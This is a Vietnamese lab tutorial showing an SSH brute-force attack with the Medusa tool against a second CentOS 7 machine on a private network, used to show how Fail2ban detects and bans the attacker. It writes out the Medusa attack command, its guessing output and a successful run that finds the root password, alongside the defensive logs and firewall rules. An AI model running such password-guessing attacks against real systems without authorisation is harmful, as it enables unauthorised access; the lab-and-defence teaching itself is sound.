# Brute Force Password với Medusa và Fail2ban

## Mục lục

[Phương án Demo](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#ph%C6%B0%C6%A1ng-%C3%A1n-demo)

[1. Cài đặt Medusa trên CentOS 7](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#1-c%C3%A0i-%C4%91%E1%BA%B7t-medusa-tr%C3%AAn-centos-7)

- [Bước 1: Cài đặt một số gói cần thiết](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#b%C6%B0%E1%BB%9Bc-1-c%C3%A0i-%C4%91%E1%BA%B7t-m%E1%BB%99t-s%E1%BB%91-g%C3%B3i-c%E1%BA%A7n-thi%E1%BA%BFt)

- [Bước 2: Cài đặt gói Medusa](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#b%C6%B0%E1%BB%9Bc-2-c%C3%A0i-%C4%91%E1%BA%B7t-g%C3%B3i-medusa)

[2. Cách thức sử dụng Medusa](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#2-c%C3%A1ch-th%E1%BB%A9c-s%E1%BB%AD-d%E1%BB%A5ng-medusa)

[3. Tiến hành Brute Force Password](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#3-ti%E1%BA%BFn-h%C3%A0nh-brute-force-password)

- [Trường hợp Medusa quét thành công](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#tr%C6%B0%E1%BB%9Dng-h%E1%BB%A3p-medusa-qu%C3%A9t-th%C3%A0nh-c%C3%B4ng)

[Tài liệu tham khảo](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Demo%20Brute%20Force%20with%20Medusa%20and%20Fail2ban.md#t%C3%A0i-li%E1%BB%87u-tham-kh%E1%BA%A3o)

## Phương án Demo

Cấu hình 2 máy CentOS 7, trong đó 1 máy `Máy 1` cài fail2ban và 1 máy `Máy 2` cài medusa.

**Cách thức tiến hành:** `Máy 2` sẽ tiến hành quét password theo dịch vụ SSH của `Máy 1`. Ta sẽ theo dõi việc công việc quét tại `Máy 2` diễn ra như thế nào và bao lâu thì **Fail2ban** sẽ tiến hành block IP của `Máy 2`.

Tham khảo cài đặt Fail2ban trên CentOS7 [tại đây](https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Fail2ban_with_CentOS7.md)

## 1. Cài đặt Medusa trên CentOS 7

### Bước 1: Cài đặt một số gói cần thiết

```
[root@localhost ~]# yum -y update
[root@localhost ~]# yum install epel-release
```

### Bước 2: Cài đặt gói Medusa

```
[root@localhost ~]# yum install medusa
```

## 2. Cách thức sử dụng Medusa

Sử dụng lệnh `medusa -h` để hiển thị các lựa chọn mà ta muốn sử dụng

```
Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a different parameter each time and they will all be sent to the module (i.e. -m Param1 -m Param2, etc.)
  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process the entire username before proceeding.
  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module's usage information
  -v [NUM]     : Verbose level [0 - 6 (more)]
  -w [NUM]     : Error debug level [0 - 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan
```

## 3. Tiến hành Brute Force Password

Có thể tải file chứa **12000 mật khẩu** hay sử dụng [tại đây](https://github.com/danielmiessler/SecLists/blob/master/Passwords/probable-v2-top12000.txt)

Tạo 1 file `password.txt` có chứa các mật khẩu thông dụng, dễ bị quét ra.

`[root@localhost ~]# vi password.txt`

Tiến hành quét `Máy 1` có sử dụng fail2ban bằng lệnh sau:

`[root@localhost ~]# medusa -h 172.16.2.194 -u root -P password.txt -M ssh`

Kết quả nhận được như sau:

```
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123456 (1 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: password (2 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123456789 (3 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 12345678 (4 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 12345 (5 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: qwerty (6 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123123 (7 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 111111 (8 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: abc123 (9 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 1234567 (10 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: dragon (11 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 1q2w3e4r (12 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: sunshine (13 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 654321 (14 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: master (15 of 235 complete)
```

Theo như kết quả nhận được, `Medusa` đã quét đến password thứ 15 thì không được nữa. Ta kiểm tra `log` của `fail2ban` tại `Máy 1`.

```
[root@localhost ~]# tail -F /var/log/fail2ban.log
2020-08-21 14:15:21,207 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:21
2020-08-21 14:15:23,054 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:23
2020-08-21 14:15:24,762 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:24
2020-08-21 14:15:27,281 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:27
2020-08-21 14:15:27,285 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:27
2020-08-21 14:15:27,286 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:27
2020-08-21 14:15:28,958 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:28
2020-08-21 14:15:31,021 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:31
2020-08-21 14:15:31,497 fail2ban.actions        [1822]: NOTICE  [sshd] Ban 172.16.2.193
2020-08-21 14:15:33,496 fail2ban.filter         [1822]: INFO    [sshd] Found 172.16.2.193 - 2020-08-21 14:15:33
```

Ta thấy `log` cảnh báo đã ban IP **172.16.2.193** của `Máy 2`. Kiểm tra trên firewall của `Máy 1`:

```
[root@localhost ~]# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
f2b-SSH    tcp  --  anywhere             anywhere             tcp dpt:ssh

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

Chain f2b-SSH (1 references)
target     prot opt source               destination
REJECT     all  --  172.16.2.193         anywhere             reject-with icmp-port-unreachable
RETURN     all  --  anywhere             anywhere
```

Địa chỉ IP **172.16.2.193** đã bị block.

Trên `Máy 2` thử SSH vào `Máy 1` thì nhận được thông báo k thể kết nối mặc dù vẫn ping được bình thường.

```
[root@localhost ~]# ping 172.16.2.194
PING 172.16.2.194 (172.16.2.194) 56(84) bytes of data.
64 bytes from 172.16.2.194: icmp_seq=1 ttl=64 time=0.381 ms
64 bytes from 172.16.2.194: icmp_seq=2 ttl=64 time=0.392 ms
^C
--- 172.16.2.194 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 0.381/0.386/0.392/0.020 ms
[root@localhost ~]# ssh root@172.16.2.194
ssh: connect to host 172.16.2.194 port 22: Connection refused
```

Để unban IP của `Máy 2`, ta sử dụng lệnh:

```
[root@localhost ~]# fail2ban-client set sshd unbanip 172.16.2.193
```

Từ `Máy 2` SSH lại và thành công:

```
[root@localhost ~]# ssh root@172.16.2.194
The authenticity of host '172.16.2.194 (172.16.2.194)' can't be established.
ECDSA key fingerprint is SHA256:bVTZ8dZ6oPko8Qc0lvA5ntQwU7XKM2qtvfoK/ZLp96g.
ECDSA key fingerprint is MD5:37:d6:c5:de:fd:b4:1f:7f:01:14:bd:20:5b:a1:d2:86.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.2.194' (ECDSA) to the list of known hosts.
root@172.16.2.194's password:
Last failed login: Fri Aug 21 14:15:33 +07 2020 from 172.16.2.193 on ssh:notty
There were 15 failed login attempts since the last successful login.
Last login: Fri Aug 21 11:48:55 2020 from 172.16.2.179
```

### Trường hợp Medusa quét thành công

```
[root@localhost ~]# medusa -h 172.16.2.194 -u root -P password.txt -M ssh
Medusa v2.1.1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123456 (1 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: password (2 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123456789 (3 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 12345678 (4 of 235 complete)
ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: admin@123 (5 of 235 complete)
ACCOUNT FOUND: [ssh] Host: 172.16.2.194 User: root Password: ********* [SUCCESS]
```

## Tài liệu tham khảo

https://news.cloud365.vn/brute-force-password-su-dung-medusa/

https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Brute%20Force%20Attack.md

https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Fail2ban_with_CentOS7.md